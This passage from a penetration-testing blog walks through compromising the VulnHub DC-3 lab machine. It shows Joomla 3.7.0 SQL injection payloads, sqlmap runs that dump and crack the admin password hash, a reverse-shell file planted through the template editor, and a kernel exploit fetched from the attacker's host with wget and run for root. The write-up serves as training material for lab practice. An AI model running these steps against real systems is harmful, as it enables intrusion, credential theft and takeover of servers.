class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> joomscan -u 192.168.135.153</span><br>Processing http://192.168.135.153 ...<br><br>[+] FireWall Detector<br>[++] Firewall not detected<br><br>[+] Detecting Joomla Version<br>[++] Joomla 3.7.0<br><br>[+] Core Joomla Vulnerability<br>[++] Target Joomla core is not vulnerable<br><br>[+] Checking Directory Listing<br>[++] directory has directory listing : <br>http://192.168.135.153/administrator/components<br>http://192.168.135.153/administrator/modules<br>http://192.168.135.153/administrator/templates<br>http://192.168.135.153/images/banners<br><br>[+] Checking apache info/status files<br>[++] Readable info/status files are not found<br><br>[+] admin finder<br>[++] Admin page : http://192.168.135.153/administrator/<br><br>[+] Checking robots.txt existing<br>[++] robots.txt is not found<br><br>[+] Finding common backup files name<br>[++] Backup files are not found<br><br>[+] Finding common log files name<br>[++] error log is not found<br><br>[+] Checking sensitive config.php.x file<br>[++] Readable config files are not found<br><br>Your Report : reports/192.168.135.153/<br></code></pre></td></tr></table></figure><p>得到 Joomla 版本为：3.7.0 。</p><h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>查找利用脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit joomla 3.7.0</span><br>-------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                            |  Path<br>-------------------------------------------------------------------------- ---------------------------------<br>Joomla! 3.7.0 - &#x27;com_fields&#x27; SQL Injection                                | php/webapps/42033.txt<br>Joomla! Component Easydiscuss &lt; 4.0.21 - Cross-Site Scripting             | php/webapps/43488.txt<br>-------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</span><br><span class="hljs-meta">#</span><span class="bash"> Exploit Title: Joomla 3.7.0 - Sql Injection</span><br><span class="hljs-meta">#</span><span class="bash"> Date: 05-19-2017</span><br><span class="hljs-meta">#</span><span class="bash"> Exploit Author: Mateus Lino</span><br><span class="hljs-meta">#</span><span class="bash"> Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</span><br><span class="hljs-meta">#</span><span class="bash"> Vendor Homepage: https://www.joomla.org/</span><br><span class="hljs-meta">#</span><span class="bash"> Version: = 3.7.0</span><br><span class="hljs-meta">#</span><span class="bash"> Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</span><br><span class="hljs-meta">#</span><span class="bash"> CVE : - CVE-2017-8917</span><br><br><br>URL Vulnerable: http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27<br><br><br>Using Sqlmap: <br><br>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br><br><br>Parameter: list[fullordering] (GET)<br>    Type: boolean-based blind<br>    Title: Boolean-based blind - Parameter replace (DUAL)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)<br><br>    Type: error-based<br>    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)<br><br>    Type: AND/OR time-based blind<br>    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)<br></code></pre></td></tr></table></figure><p>访问试一下，的确存在 SQL 注入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> http://192.168.135.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</span><br><br>500 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;\&#x27;&#x27; at line 9<br></code></pre></td></tr></table></figure><p>直接使用 sqlmap ： </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sqlmap -u <span class="hljs-string">&quot;http://192.168.135.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br>[09:39:59] [INFO] fetching database names<br>[09:39:59] [INFO] retrieved: &#x27;information_schema&#x27;<br>[09:39:59] [INFO] retrieved: &#x27;joomladb&#x27;<br>[09:39:59] [INFO] retrieved: &#x27;mysql&#x27;<br>[09:39:59] [INFO] retrieved: &#x27;performance_schema&#x27;<br>[09:39:59] [INFO] retrieved: &#x27;sys&#x27;<br>available databases [5]:<br>[*] information_schema<br>[*] joomladb<br>[*] mysql<br>[*] performance_schema<br>[*] sys<br></code></pre></td></tr></table></figure><p>查找当前库名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sqlmap -u <span class="hljs-string">&quot;http://192.168.135.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --current-db -p list[fullordering]</span><br>[09:43:57] [INFO] fetching current database<br>[09:43:57] [INFO] retrieved: &#x27;joomladb&#x27;<br>current database: &#x27;joomladb&#x27;<br></code></pre></td></tr></table></figure><p>查找 joomladb 数据库的表名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sqlmap -u <span class="hljs-string">&quot;http://192.168.135.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D <span class="hljs-string">&quot;joomladb&quot;</span> --tables  -p list[fullordering]</span><br>[09:45:34] [INFO] fetching tables for database: &#x27;joomladb&#x27;<br>[......]<br>[09:45:37] [INFO] retrieved: &#x27;#__user_keys&#x27;<br>[09:45:37] [INFO] retrieved: &#x27;#__user_notes&#x27;<br>[09:45:37] [INFO] retrieved: &#x27;#__user_profiles&#x27;<br>[09:45:37] [INFO] retrieved: &#x27;#__user_usergroup_m&#x27;<br>[09:45:37] [INFO] retrieved: &#x27;#__usergroups&#x27;<br>[09:45:37] [INFO] retrieved: &#x27;#__users&#x27;<br>[......]<br>Database: joomladb<br>[76 tables]<br>+---------------------+<br>| [......]            |<br>| #__user_keys        |<br>| #__user_notes       |<br>| #__user_profiles    |<br>| #__user_usergroup_m |<br>| #__usergroups       |<br>| #__users            |<br>| [......]            |<br>+---------------------+<br></code></pre></td></tr></table></figure><p>查找 __users 表的属性名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sqlmap -u <span class="hljs-string">&quot;http://192.168.135.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D <span class="hljs-string">&quot;joomladb&quot;</span> -T <span class="hljs-string">&quot;#__users&quot;</span> --columns  -p list[fullordering]</span><br>[09:47:55] [INFO] fetching columns for table &#x27;#__users&#x27; in database &#x27;joomladb&#x27;<br>[09:47:55] [WARNING] unable to retrieve column names for table &#x27;#__users&#x27; in database &#x27;joomladb&#x27;<br>do you want to use common column existence check? [y/N/q] y<br>[09:47:57] [WARNING] in case of continuous data retrieval problems you are advised to try a switch &#x27;--no-cast&#x27; or switch &#x27;--hex&#x27;<br>which common columns (wordlist) file do you want to use?<br>[1] default &#x27;/usr/share/sqlmap/data/txt/common-columns.txt&#x27; (press Enter)<br>[2] custom<br><span class="hljs-meta">&gt;</span><span class="bash"> </span><br>[09:48:38] [INFO] checking column existence using items from &#x27;/usr/share/sqlmap/data/txt/common-columns.txt&#x27;<br>[09:48:38] [INFO] adding words used on web page to the check list<br>please enter number of threads? [Enter for 1 (current)] <br>[09:48:48] [WARNING] running in a single-thread mode. This could take a while<br>[09:48:48] [INFO] retrieved: id<br>[09:48:48] [INFO] retrieved: name<br>[09:48:48] [INFO] retrieved: username<br>[09:48:48] [INFO] retrieved: email<br>[09:48:51] [INFO] retrieved: password<br>[09:49:29] [INFO] retrieved: params<br><br>Database: joomladb<br>Table: #__users<br>[6 columns]<br>+----------+-------------+<br>| Column   | Type        |<br>+----------+-------------+<br>| email    | non-numeric |<br>| id       | numeric     |<br>| name     | non-numeric |<br>| params   | non-numeric |<br>| password | non-numeric |<br>| username | non-numeric |<br>+----------+-------------+<br></code></pre></td></tr></table></figure><p>查找 __users 表的用户名和密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sqlmap  -u <span class="hljs-string">&quot;http://192.168.135.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D <span class="hljs-string">&quot;joomladb&quot;</span> -T <span class="hljs-string">&quot;#__users&quot;</span> -C <span class="hljs-string">&quot;name,password&quot;</span> --dump  -p list[fullordering]</span><br>[09:50:06] [INFO] fetching entries of column(s) &#x27;name,password&#x27; for table &#x27;#__users&#x27; in database &#x27;joomladb&#x27;<br>[09:50:06] [INFO] retrieved: &#x27;admin&#x27;<br>[09:50:06] [INFO] retrieved: &#x27;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#x27;<br>Database: joomladb<br>Table: #__users<br>[1 entry]<br>+-------+--------------------------------------------------------------+<br>| name  | password                                                     |<br>+-------+--------------------------------------------------------------+<br>| admin | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |<br>+-------+--------------------------------------------------------------+<br></code></pre></td></tr></table></figure><p>john 解密：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#x27;</span> &gt; passwd</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> john passwd</span>                                                      <br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status<br>Almost done: Processing the remaining buffered candidate passwords, if any.<br>Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist<br>snoopy           (?)<br>Use the &quot;--show&quot; option to display all of the cracked passwords reliably<br>Session completed<br></code></pre></td></tr></table></figure><p>访问 <code>http://192.168.135.153/administrator/</code> ，登录后查看后台，在 <code>templates: templates</code> 发现可以修改文件和创建文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">CONFIGURATION--Templates--Templates--Beez3 Details and Files--index.php<br></code></pre></td></tr></table></figure><p>直接创建一个 shell.php，将反弹 shell 写进去，再加一个标识 <code>this is a shell</code> ，方便查找文件位置 。</p><p>访问 <code>http://192.168.135.153/templates/beez3/shell.php</code> ，发现是我们写的 shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">this is a shell WARNING: Failed to daemonise. This is quite common and not fatal. Connection refused (111)<br></code></pre></td></tr></table></figure><p>kali 监听，得到 shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 1234</span><br>listening on [any] 1234 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.153] 46398<br>Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux<br> 00:58:50 up  2:28,  0 users,  load average: 0.02, 0.02, 0.05<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>/bin/sh: 0: can&#x27;t access tty; job control turned off<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>www-data<br></code></pre></td></tr></table></figure><h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><p>查看内核：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> uname -a</span><br>Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux<br><span class="hljs-meta">$</span><span class="bash"> lsb_release -a</span><br>No LSB modules are available.<br>Distributor ID: Ubuntu<br>Description:    Ubuntu 16.04 LTS<br>Release:        16.04<br>Codename:       xenial<br></code></pre></td></tr></table></figure><p>在 searchploit 寻找关于 ubuntu16.04 的权限提升的漏洞：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit ubuntu 16.04 Privilege Escalation linux</span> <br>Exploit Title: Linux Kernel 4.4.x (Ubuntu 16.04) - &#x27;double-fdput()&#x27; bpf(BPF_PROG_LOAD) Privilege Escalation<br>Path: linux/local/39772.txt<br></code></pre></td></tr></table></figure><p>打开文件查看漏洞具体利用方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /usr/share/exploitdb/exploits/linux/<span class="hljs-built_in">local</span>/39772.txt</span><br><br>An exploit that puts all this together is in exploit.tar. Usage:<br><br>user@host:~/ebpf_mapfd_doubleput$ ./compile.sh<br>user@host:~/ebpf_mapfd_doubleput$ ./doubleput<br>starting writev<br>woohoo, got pointer reuse<br>writev returned successfully. if this worked, you&#x27;ll have a root shell in &lt;=60 seconds.<br>suid file detected, launching rootshell...<br>we have root privs now...<br>root@host:~/ebpf_mapfd_doubleput# id<br>uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)<br><br>This exploit was tested on a Ubuntu 16.04 Desktop system.<br><br>Fix: https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7<br><br><br>Proof of Concept: https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552<br>Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip     <br></code></pre></td></tr></table></figure><p>下载 exp 到 dc3 的本地：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br>--2022-07-04 01:14:31--  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip<br>Resolving github.com (github.com)... 20.205.243.166<br>Connecting to github.com (github.com)|20.205.243.166|:443... connected.<br>Unable to establish SSL connection.<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br>--2022-07-04 01:16:17--  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip<br>Resolving github.com (github.com)... 20.205.243.166<br>Connecting to github.com (github.com)|20.205.243.166|:443... failed: Connection refused.<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wget http://192.168.135.141:8888/39772.zip</span>    <br>--2022-07-04 01:19:36--  http://192.168.135.141:8888/39772.zip<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 7025 (6.9K) [application/zip]<br>39772.zip: Permission denied<br><br>Cannot write to &#x27;39772.zip&#x27; (Success).<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">pwd</span></span><br>/<br><span class="hljs-meta">$</span><span class="bash"> ls -l</span><br>[......]<br>drwxrwxrwt   9 root root  4096 Jul  4 17:48 tmp<br>[......]<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> /tmp</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wget http://192.168.135.141:8888/39772.zip</span>    <br>--2022-07-04 17:48:40--  http://192.168.135.141:8888/39772.zip<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 7025 (6.9K) [application/zip]<br>Saving to: &#x27;39772.zip&#x27;<br><br>     0K ......                                                100% 18.4M=0s<br><br>2022-07-04 17:48:40 (18.4 MB/s) - &#x27;39772.zip&#x27; saved [7025/7025]<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>39772.zip<br>systemd-private-3fa2825cd4ff47fbb6b4b797e59e4504-systemd-timesyncd.service-oDSbXI<br>vmware-root<br></code></pre></td></tr></table></figure><p>解压：</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> unzip 39772.zip</span><br>Archive:  39772.zip<br>   creating: 39772/<br>  inflating: 39772/.DS_Store         <br>   creating: __MACOSX/<br>   creating: __MACOSX/39772/<br>  inflating: __MACOSX/39772/._.DS_Store  <br>  inflating: 39772/crasher.tar       <br>  inflating: __MACOSX/39772/._crasher.tar  <br>  inflating: 39772/exploit.tar       <br>  inflating: __MACOSX/39772/._exploit.tar  <br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>39772<br>39772.zip<br>__MACOSX<br>systemd-private-3fa2825cd4ff47fbb6b4b797e59e4504-systemd-timesyncd.service-oDSbXI<br>vmware-root<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> 39772</span><br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>crasher.tar<br>exploit.tar<br><span class="hljs-meta">$</span><span class="bash"> tar -xvf exploit.tar</span><br>ebpf_mapfd_doubleput_exploit/<br>ebpf_mapfd_doubleput_exploit/hello.c<br>ebpf_mapfd_doubleput_exploit/suidhelper.c<br>ebpf_mapfd_doubleput_exploit/compile.sh<br>ebpf_mapfd_doubleput_exploit/doubleput.c<br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>crasher.tar<br>ebpf_mapfd_doubleput_exploit<br>exploit.tar<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> ebpf_mapfd_doubleput_exploit</span><br><span class="hljs-meta">$</span><span class="bash"> ls -l</span>       <br>total 20<br>-rwxr-x--- 1 www-data www-data  155 Apr 26  2016 compile.sh<br>-rw-r----- 1 www-data www-data 4188 Apr 26  2016 doubleput.c<br>-rw-r----- 1 www-data www-data 2186 Apr 26  2016 hello.c<br>-rw-r----- 1 www-data www-data  255 Apr 26  2016 suidhelper.c<br></code></pre></td></tr></table></figure><p> 执行编译和利用脚本，成功得到 root：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./compile.sh</span><br>doubleput.c: In function &#x27;make_setuid&#x27;:<br>doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]<br>    .insns = (__aligned_u64) insns,<br>             ^<br>doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]<br>    .license = (__aligned_u64)&quot;&quot;<br>               ^<br><span class="hljs-meta">$</span><span class="bash"> ls -l</span><br>total 52<br>-rwxr-x--- 1 www-data www-data   155 Apr 26  2016 compile.sh<br>-rwxrwxrwx 1 www-data www-data 12336 Jul  4 17:54 doubleput<br>-rw-r----- 1 www-data www-data  4188 Apr 26  2016 doubleput.c<br>-rwxrwxrwx 1 www-data www-data  8028 Jul  4 17:54 hello<br>-rw-r----- 1 www-data www-data  2186 Apr 26  2016 hello.c<br>-rwxrwxrwx 1 www-data www-data  7524 Jul  4 17:54 suidhelper<br>-rw-r----- 1 www-data www-data   255 Apr 26  2016 suidhelper.c<br><span class="hljs-meta">$</span><span class="bash"> ./doubleput</span><br>starting writev<br>woohoo, got pointer reuse<br>writev returned successfully. if this worked, you&#x27;ll have a root shell in &lt;=60 seconds.<br>suid file detected, launching rootshell...<br>we have root privs now...<br>whoami<br>root<br>id<br>uid=0(root) gid=0(root) groups=0(root),33(www-data)<br></code></pre></td></tr></table></figure><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>1、端口扫描、目录扫描</p><p>2、joomla CMS：joomscan 扫描、sqlmap 注入</p><p>3、后台登录、反弹shell上传</p><p>4、内核提权</p>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Empire：LupinOne</title>
    <link href="/2022/07/02/Penetration/Vulnhub/Part-1/0x10%20Empire-LupinOne/"/>
    <url>/2022/07/02/Penetration/Vulnhub/Part-1/0x10%20Empire-LupinOne/</url>
    
